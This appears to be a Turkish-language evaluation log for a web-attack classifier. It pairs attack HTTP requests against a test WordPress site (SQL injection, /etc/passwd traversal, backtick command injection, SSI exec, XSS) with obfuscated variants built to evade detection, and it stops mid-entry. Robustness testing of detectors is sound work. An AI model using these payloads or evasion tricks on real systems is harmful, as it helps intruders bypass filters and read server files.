# Gizleme örnekleri — ds_base_random_s42

Her dönüşüm ve sınıf için en fazla 2 örnek (yalnızca değişen kısım çevresi).

## case

Varsayım: SQLi: SQL anahtar kelimeleri; XSS: HTML etiket/öznitelik adları büyük/küçük harfe duyarsızdır.

- **SQL Injection** (tahmin: SQL Injection → SQL Injection)
  - önce: `GET /%2522%253E%253C%2521--%2523EXEC%2Bcmd%253D%2522ls%2B%252F%2522--%253E%253C/inde`
  - sonra: `GET /%2522%253E%253C%2521--%2523exEC%2Bcmd%253D%2522ls%2B%252F%2522--%253E%253C/inde`
- **SQL Injection** (tahmin: SQL Injection → SQL Injection)
  - önce: `GET /blog/index.php%27+OR+%271%27%3D%271/2020 HTTP/1.1 Host: test-site.com `
  - sonra: `GET /blog/index.php%27+Or+%271%27%3D%271/2020 HTTP/1.1 Host: test-site.com `

## whitespace

Varsayım: Payload benzeri parçalarda boşluk yerine sekme: SQL, HTML öznitelik ayırıcısı, POSIX kabuk (IFS), HTTP header OWS için eşdeğer.

- **Code Injection** (tahmin: Code Injection → Code Injection)
  - önce: `assword_current=tNCEQiU&password_1=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&password_2=tNCEQiU&_wpnonce=b9dad6a8b5`
  - sonra: `assword_current=tNCEQiU&password_1=%3C%21--%23EXEC%09cmd%3D%22ls%09%2F%22--%3E&password_2=tNCEQiU&_wpnonce=b9dad6a8b5`
- **Code Injection** (tahmin: Code Injection → Code Injection)
  - önce: `b8F-es&password_2=Fb8F-es&_wpnonce=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&_wp_http_referer=%2Fblog%2Findex.php%2`
  - sonra: `b8F-es&password_2=Fb8F-es&_wpnonce=%3C%21--%23EXEC%09cmd%3D%22ls%09%2F%22--%3E&_wp_http_referer=%2Fblog%2Findex.php%2`
- **Dictionary-based Password Attack** (tahmin: Dictionary-based Password Attack → Dictionary-based Password Attack)
  - önce: `tion/x-www-form-urlencoded  log=amusedHeron9%25%22++--+&pwd=6ro#IzFE&rememberme=forever&wp-submit=Log+In&`
  - sonra: `tion/x-www-form-urlencoded  log=amusedHeron9%25%22%09%09--%09&pwd=6ro#IzFE&rememberme=forever&wp-submit=Log+In&`
- **Dictionary-based Password Attack** (tahmin: Dictionary-based Password Attack → Dictionary-based Password Attack)
  - önce: `Salt2&pwd=Uv1Bo!-&rememberme=forever&wp-submit=Log+In%27&redirect_to=http%3A%2F%2Ftest-site.com%2Fblo`
  - sonra: `Salt2&pwd=Uv1Bo!-&rememberme=forever&wp-submit=Log%09In%27&redirect_to=http%3A%2F%2Ftest-site.com%2Fblo`
- **Fake the Source of Data** (tahmin: Fake the Source of Data → Fake the Source of Data)
  - önce: `A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520union/2020/03/23/fuga-aut-recusandae-sed-dolor-qui`
  - sonra: `A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2509union/2020/03/23/fuga-aut-recusandae-sed-dolor-qui`
- **Fake the Source of Data** (tahmin: Fake the Source of Data → Fake the Source of Data)
  - önce: `A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520limit/feed HTTP/1.1 Host: test-site.com User-Agent`
  - sonra: `A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2509limit/feed HTTP/1.1 Host: test-site.com User-Agent`
- **HTTP Response Splitting** (tahmin: HTTP Response Splitting → HTTP Response Splitting)
  - önce: `GET /blog/index.php/2020%0Asleep+15%0A/03 HTTP/1.1 Host: test-site.com User-Agent: `
  - sonra: `GET /blog/index.php/2020%0Asleep%0915%0A/03 HTTP/1.1 Host: test-site.com User-Agent: `
- **HTTP Response Splitting** (tahmin: HTTP Response Splitting → HTTP Response Splitting)
  - önce: `GET /blog/index.php/2020/03/22%0Asleep+15%0A/quidem-rerum-sit-doloribus-quia-eum HTTP/1.1`
  - sonra: `GET /blog/index.php/2020/03/22%0Asleep%0915%0A/quidem-rerum-sit-doloribus-quia-eum HTTP/1.1`
- **HTTP Verb Tampering** (tahmin: HTTP Verb Tampering → HTTP Verb Tampering)
  - önce: `CK /blog/index.php/my-account/edit-profile/%7B%7B%20data.icon4YKCH HTTP/1.1 Host: test-site.com User-A`
  - sonra: `CK /blog/index.php/my-account/edit-profile/%7B%7B%09data.icon4YKCH HTTP/1.1 Host: test-site.com User-A`
- **HTTP Verb Tampering** (tahmin: HTTP Verb Tampering → HTTP Verb Tampering)
  - önce: `CK /blog/index.php/my-account/edit-profile/%7B%7B%20data.image.src2YAR0 HTTP/1.1 Host: test-site.com U`
  - sonra: `CK /blog/index.php/my-account/edit-profile/%7B%7B%09data.image.src2YAR0 HTTP/1.1 Host: test-site.com U`
- **Input Data Manipulation** (tahmin: Input Data Manipulation → Input Data Manipulation)
  - önce: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: etc/passwd  username=truthfulWigeon4&password=F3nGVaF&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2`
  - sonra: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: etc/passwd  username=truthfulWigeon4&password=F3nGVaF&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2`
- **Input Data Manipulation** (tahmin: Input Data Manipulation → Input Data Manipulation)
  - önce: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: http://www.google.com/search?q=OWASP%20freedom  username=pleasedSalami8&password=1r65p&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.`
  - sonra: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: http://www.google.com/search?q=OWASP%20freedom  username=pleasedSalami8&password=1r65p&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.`
- **OS Command Injection** (tahmin: OS Command Injection → OS Command Injection)
  - önce: `ofile/post.php/?action=%2Fetc%2Fpasswd&post=%7B%7B+data.id+%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
  - sonra: `ofile/post.php/?action=%2Fetc%2Fpasswd&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
- **OS Command Injection** (tahmin: OS Command Injection → OS Command Injection)
  - önce: `F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&post=%7B%7B+data.id+%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
  - sonra: `F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
- **Path Traversal** (tahmin: Path Traversal → Path Traversal)
  - önce: `%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&post=%7B%7B+data.id+%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: application/x-www-form-urlencoded  username=tautCrackers0&password=n0L&7*!&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-accoun`
  - sonra: `%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: application/x-www-form-urlencoded  username=tautCrackers0&password=n0L&7*!&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-ac`
- **Path Traversal** (tahmin: Path Traversal → Path Traversal)
  - önce: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: ..`
  - sonra: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: ..`
- **Protocol Manipulation** (tahmin: Protocol Manipulation → Protocol Manipulation)
  - önce: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=soluti`
  - sonra: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=soluti`
- **Protocol Manipulation** (tahmin: Protocol Manipulation → Protocol Manipulation)
  - önce: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
  - sonra: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
- **SQL Injection** (tahmin: SQL Injection → SQL Injection)
  - önce: ` /blog/c%253A%252F/my-account/edit-profile/%7B%7B%20data.editLink%20%7D%7D&image-editor HTTP/1.1 Host: test-site.com U`
  - sonra: ` /blog/c%253A%252F/my-account/edit-profile/%7B%7B%09data.editLink%09%7D%7D&image-editor HTTP/1.1 Host: test-site.com U`
- **SQL Injection** (tahmin: SQL Injection → Normal)
  - önce: `GET /blog/%252F/my-account/edit-profile/%7B%7B%20data.model.url HTTP/1.1 Host: test-site.com User-A`
  - sonra: `GET /blog/%252F/my-account/edit-profile/%7B%7B%09data.model.url HTTP/1.1 Host: test-site.com User-A`

## sql_comment

Varsayım: SQL anahtar kelimelerine bitişik boşluk yerine /**/ (MySQL, PostgreSQL, MSSQL'de eşdeğer).

- **SQL Injection** (tahmin: SQL Injection → SQL Injection)
  - önce: `GET /%2522%253E%253C%2521--%2523EXEC%2Bcmd%253D%2522ls%2B%252F%2522--%253E%253C/index.php`
  - sonra: `GET /%2522%253E%253C%2521--%2523EXEC%252F%252A%252A%252Fcmd%253D%2522ls%2B%252F%2522--%253E%253C/index.php`
- **SQL Injection** (tahmin: SQL Injection → SQL Injection)
  - önce: `GET /blog/index.php%27+OR+%271%27%3D%271/2020 HTTP/1.1 Host: test-site.com U`
  - sonra: `GET /blog/index.php%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271/2020 HTTP/1.1 Host: test-site.com U`

## cmd_quote

Varsayım: Kabuk komut adına boş tırnak çifti ("") eklemek (bash/sh ve cmd.exe komut adını değiştirmez).

- **OS Command Injection** (tahmin: OS Command Injection → OS Command Injection)
  - önce: `/x-www-form-urlencoded  password_current=c4T7!%60cat+%2Fetc%2Fpasswd%60&password_1=c4T7!&password_2=`
  - sonra: `/x-www-form-urlencoded  password_current=c4T7!%60c%22%22at+%2Fetc%2Fpasswd%60&password_1=c4T7!&password_2=`
- **OS Command Injection** (tahmin: OS Command Injection → OS Command Injection)
  - önce: `www-form-urlencoded  password_current=2ojMKcQj%60sleep+15%60&password_1=2ojMKcQj&password_2=2ojMKcQj`
  - sonra: `www-form-urlencoded  password_current=2ojMKcQj%60s%22%22leep+15%60&password_1=2ojMKcQj&password_2=2ojMKcQj`

## path_dot

Varsayım: '../' yerine './../' (yol çözümlemesinde eşdeğer).

- **Path Traversal** (tahmin: Path Traversal → Path Traversal)
  - önce: `GET /..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1 Host: test-site.com`
  - sonra: `GET /.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2Fetc%2Fpasswd HTTP/1.1 Host: test-site.com`
- **Path Traversal** (tahmin: Path Traversal → Path Traversal)
  - önce: `GET /blog/%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C HTTP/1.1 Host: test-site.com User-Agent:`
  - sonra: `GET /blog/%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C HTTP/1.1 Host: test-site.com User-Agent:`

## encoding_norm

Varsayım: ÇÖZÜCÜYE BAĞLI: çok katmanlı URL encoding tek katmana indirilir; hedef yinelemeli çözüyorsa eşdeğer.

- **Code Injection** (tahmin: Code Injection → Code Injection)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **Code Injection** (tahmin: Code Injection → Code Injection)
  - önce: `GET /blog/index.php/%2527%2522%253Cscript%253Ealert%25281%2529%253B%253C%252Fscript%253E/edit-profile/%7B%7B%20data.editLink%20%7D%7D&im`
  - sonra: `GET /blog/index.php/%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E/edit-profile/%7B%7B%20data.editLink%20%7D%7D&im`
- **Dictionary-based Password Attack** (tahmin: Dictionary-based Password Attack → Dictionary-based Password Attack)
  - önce: `3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP&pwd=OHs2MfF&rememberme=forever&wp-submit=Log+`
  - sonra: `3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%20ZAP&pwd=OHs2MfF&rememberme=forever&wp-submit=Log+`
- **Dictionary-based Password Attack** (tahmin: Dictionary-based Password Attack → Dictionary-based Password Attack)
  - önce: `encoded  log=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP&pwd=_Ed15z&rememberme=forever&wp-submit=Log+I`
  - sonra: `encoded  log=www.google.com%2Fsearch%3Fq%3DOWASP%20ZAP&pwd=_Ed15z&rememberme=forever&wp-submit=Log+I`
- **Fake the Source of Data** (tahmin: Fake the Source of Data → Fake the Source of Data)
  - önce: `ttps%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520agreement/index.php/2020 HTTP/1.1 Host: test-site`
  - sonra: `ttps%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%20agreement/index.php/2020 HTTP/1.1 Host: test-site`
- **Fake the Source of Data** (tahmin: Fake the Source of Data → Fake the Source of Data)
  - önce: `http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520president/index.php/2020/03 HTTP/1.1 Host: test-s`
  - sonra: `http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%20president/index.php/2020/03 HTTP/1.1 Host: test-s`
- **HTTP Response Splitting** (tahmin: HTTP Response Splitting → HTTP Response Splitting)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **HTTP Response Splitting** (tahmin: HTTP Response Splitting → HTTP Response Splitting)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **HTTP Verb Tampering** (tahmin: HTTP Verb Tampering → HTTP Verb Tampering)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **HTTP Verb Tampering** (tahmin: HTTP Verb Tampering → HTTP Verb Tampering)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **Input Data Manipulation** (tahmin: Input Data Manipulation → Input Data Manipulation)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **Input Data Manipulation** (tahmin: Input Data Manipulation → Input Data Manipulation)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **OS Command Injection** (tahmin: OS Command Injection → OS Command Injection)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **OS Command Injection** (tahmin: OS Command Injection → OS Command Injection)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **Path Traversal** (tahmin: Path Traversal → Path Traversal)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **Path Traversal** (tahmin: Path Traversal → Path Traversal)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **Protocol Manipulation** (tahmin: Protocol Manipulation → Protocol Manipulation)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **Protocol Manipulation** (tahmin: Protocol Manipulation → Protocol Manipulation)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **SQL Injection** (tahmin: SQL Injection → Normal)
  - önce: `GET /blog/c%253A%252F/my-account/edit-profile/%7B%7B%20data.editLink%`
  - sonra: `GET /blog/c%3A%2F/my-account/edit-profile/%7B%7B%20data.editLink%`
- **SQL Injection** (tahmin: SQL Injection → Normal)
  - önce: `GET /blog/%252F/my-account/edit-profile/%7B%7B%20data.model.url `
  - sonra: `GET /blog/%2F/my-account/edit-profile/%7B%7B%20data.model.url `

## combo

Varsayım: Kategoriye uygulanabilen tüm dönüşümler birlikte: artifact, sql_comment, html_slash, cmd_quote, path_dot, case, whitespace (çözücüye bağlı encoding_norm hariç).

- **Code Injection** (tahmin: Code Injection → Code Injection)
  - önce: `assword_current=tNCEQiU&password_1=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&password_2=tNCEQiU&_wpnonce=b9dad6a8b5`
  - sonra: `assword_current=tNCEQiU&password_1=%3C%21--%23EXEC%09cmd%3D%22ls%09%2F%22--%3E&password_2=tNCEQiU&_wpnonce=b9dad6a8b5`
- **Code Injection** (tahmin: Code Injection → Code Injection)
  - önce: `b8F-es&password_2=Fb8F-es&_wpnonce=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&_wp_http_referer=%2Fblog%2Findex.php%2`
  - sonra: `b8F-es&password_2=Fb8F-es&_wpnonce=%3C%21--%23EXEC%09cmd%3D%22ls%09%2F%22--%3E&_wp_http_referer=%2Fblog%2Findex.php%2`
- **Dictionary-based Password Attack** (tahmin: Dictionary-based Password Attack → Dictionary-based Password Attack)
  - önce: `tion/x-www-form-urlencoded  log=amusedHeron9%25%22++--+&pwd=6ro#IzFE&rememberme=forever&wp-submit=Log+In&`
  - sonra: `tion/x-www-form-urlencoded  log=amusedHeron9%25%22%09%09--%09&pwd=6ro#IzFE&rememberme=forever&wp-submit=Log+In&`
- **Dictionary-based Password Attack** (tahmin: Dictionary-based Password Attack → Dictionary-based Password Attack)
  - önce: `Salt2&pwd=Uv1Bo!-&rememberme=forever&wp-submit=Log+In%27&redirect_to=http%3A%2F%2Ftest-site.com%2Fblo`
  - sonra: `Salt2&pwd=Uv1Bo!-&rememberme=forever&wp-submit=Log%09In%27&redirect_to=http%3A%2F%2Ftest-site.com%2Fblo`
- **Fake the Source of Data** (tahmin: Fake the Source of Data → Fake the Source of Data)
  - önce: `A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520union/2020/03/23/fuga-aut-recusandae-sed-dolor-qui`
  - sonra: `A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2509union/2020/03/23/fuga-aut-recusandae-sed-dolor-qui`
- **Fake the Source of Data** (tahmin: Fake the Source of Data → Fake the Source of Data)
  - önce: `A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520limit/feed HTTP/1.1 Host: test-site.com User-Agent`
  - sonra: `A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2509limit/feed HTTP/1.1 Host: test-site.com User-Agent`
- **HTTP Response Splitting** (tahmin: HTTP Response Splitting → HTTP Response Splitting)
  - önce: `GET /blog/index.php/2020%0Asleep+15%0A/03 HTTP/1.1 Host: test-site.com User-Agent: `
  - sonra: `GET /blog/index.php/2020%0Asleep%0915%0A/03 HTTP/1.1 Host: test-site.com User-Agent: `
- **HTTP Response Splitting** (tahmin: HTTP Response Splitting → HTTP Response Splitting)
  - önce: `GET /blog/index.php/2020/03/22%0Asleep+15%0A/quidem-rerum-sit-doloribus-quia-eum HTTP/1.1`
  - sonra: `GET /blog/index.php/2020/03/22%0Asleep%0915%0A/quidem-rerum-sit-doloribus-quia-eum HTTP/1.1`
- **HTTP Verb Tampering** (tahmin: HTTP Verb Tampering → HTTP Verb Tampering)
  - önce: `CK /blog/index.php/my-account/edit-profile/%7B%7B%20data.icon4YKCH HTTP/1.1 Host: test-site.com User-A`
  - sonra: `CK /blog/index.php/my-account/edit-profile/%7B%7B%09data.icon4YKCH HTTP/1.1 Host: test-site.com User-A`
- **HTTP Verb Tampering** (tahmin: HTTP Verb Tampering → HTTP Verb Tampering)
  - önce: `CK /blog/index.php/my-account/edit-profile/%7B%7B%20data.image.src2YAR0 HTTP/1.1 Host: test-site.com U`
  - sonra: `CK /blog/index.php/my-account/edit-profile/%7B%7B%09data.image.src2YAR0 HTTP/1.1 Host: test-site.com U`
- **Input Data Manipulation** (tahmin: Input Data Manipulation → Input Data Manipulation)
  - önce: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: etc/passwd  username=truthfulWigeon4&password=F3nGVaF&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2`
  - sonra: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: etc/passwd  username=truthfulWigeon4&password=F3nGVaF&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2`
- **Input Data Manipulation** (tahmin: Input Data Manipulation → Input Data Manipulation)
  - önce: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: http://www.google.com/search?q=OWASP%20freedom  username=pleasedSalami8&password=1r65p&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.`
  - sonra: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: http://www.google.com/search?q=OWASP%20freedom  username=pleasedSalami8&password=1r65p&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.`
- **OS Command Injection** (tahmin: OS Command Injection → OS Command Injection)
  - önce: `ofile/post.php/?action=%2Fetc%2Fpasswd&post=%7B%7B+data.id+%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
  - sonra: `ofile/post.php/?action=%2Fetc%2Fpasswd&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
- **OS Command Injection** (tahmin: OS Command Injection → OS Command Injection)
  - önce: `F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&post=%7B%7B+data.id+%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
  - sonra: `F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
- **Path Traversal** (tahmin: Path Traversal → Path Traversal)
  - önce: `GET /..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1 Host: test-site.com`
  - sonra: `GET /.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2Fetc%2Fpasswd HTTP/1.1 Host: test-site.com`
- **Path Traversal** (tahmin: Path Traversal → Path Traversal)
  - önce: `GET /blog/%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C HTTP/1.1 Host: test-site.com User-Agent:`
  - sonra: `GET /blog/%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C.%5C..%5C HTTP/1.1 Host: test-site.com User-Agent:`
- **Protocol Manipulation** (tahmin: Protocol Manipulation → Protocol Manipulation)
